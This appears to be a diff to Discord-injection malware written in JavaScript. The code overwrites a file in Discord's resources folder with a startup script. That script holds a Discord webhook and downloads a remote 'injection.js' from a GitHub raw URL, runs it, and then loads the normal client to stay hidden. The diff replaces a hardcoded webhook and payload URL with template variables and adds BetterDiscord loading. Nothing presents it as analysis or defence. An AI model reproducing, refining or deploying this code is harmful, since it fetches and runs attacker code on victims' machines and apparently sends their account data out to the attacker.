@@ -370,13 +370,14 @@ async function initiation() {
 
     fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
 
-    const startUpScript = `const fs = require('fs');
+    const startUpScript = `
+const fs = require('fs');
 const https = require('https');
 const path = require('path');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1501483874222608507/FDcwuZLFcZn57oopdAPCS3l7qooDz6rtPqMvU4fYgJvRmN7VOgbAg_sgQCiVTPisp-1X",
-    injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js"
+    webhook: "${CONFIG.webhook}",
+    injection_url: "${CONFIG.injection_url}"
 };
 
 // Find core index.js
@@ -391,7 +392,6 @@ async function loadInjection() {
         const res = await new Promise((resolve, reject) => {
             https.get(CONFIG.injection_url, resolve).on('error', reject);
         });
-
         let data = '';
         res.on('data', chunk => data += chunk);
         res.on('end', () => {
@@ -416,9 +416,10 @@ if (fs.existsSync(indexJs)) {
 
 // Load normal Discord + BetterDiscord
 require(path.join(appPath, 'app.asar'));
-// if (fs.existsSync(bdPath)) require(bdPath);`;
+if (fs.existsSync(bdPath)) require(bdPath);
+`;
 
-    fs.writeFileSync(resourceIndex, startUpScript);
+fs.writeFileSync(resourceIndex, startUpScript);
 }
 
 // ==================== DEBUGGER & WEBREQUEST ====================
@@ -492,5 +493,7 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
 });
 
 // BetterDiscord support
+const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
+if (fs.existsSync(bdPath)) require(bdPath);
 
 module.exports = require("./core.asar");
